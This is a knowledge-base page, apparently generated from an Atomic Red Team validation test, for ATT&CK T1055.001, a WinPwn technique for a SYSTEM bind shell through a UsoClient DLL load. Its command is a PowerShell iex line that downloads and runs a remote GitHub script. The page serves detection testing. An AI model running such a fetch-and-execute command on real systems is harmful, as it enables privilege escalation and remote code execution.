---
atomic_guid: "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5"
title: "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1055.001"
attack_technique_name: "Process Injection: Dynamic-link Library Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5"
  - "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1055-process_injection#^t1055001-dynamic-link-library-injection|T1055.001: Dynamic-link Library Injection]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.yaml)
